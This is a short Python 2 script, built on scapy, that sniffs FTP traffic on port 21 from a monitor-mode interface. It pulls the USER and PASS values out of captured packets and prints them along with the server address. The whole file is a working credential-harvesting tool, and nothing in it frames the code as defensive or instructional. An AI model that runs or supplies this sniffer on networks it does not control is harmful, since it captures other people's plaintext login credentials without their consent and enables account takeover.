from scapy.all import *
def ftpSniff(pkt):
    dest = pkt.getlayer(IP).dst
    raw = pkt.sprintf('%Raw.load%')
    user = re.findall('(?i)USER (.*)', raw)
    pswd = re.findall('(?i)PASS (.*)', raw)
    if user:
        print '[*] Detected FTP Login to ' + str(dest)
        print '[+] User account: ' + str(user[0])
    elif pswd:
        print '[+] Password: ' + str(pswd[0])

conf.iface = "mon0"
try:
    print 'Starting'
    sniff(filter='tcp port 21', prn=ftpSniff)
except KeyboardInterrupt:
    exit(0)

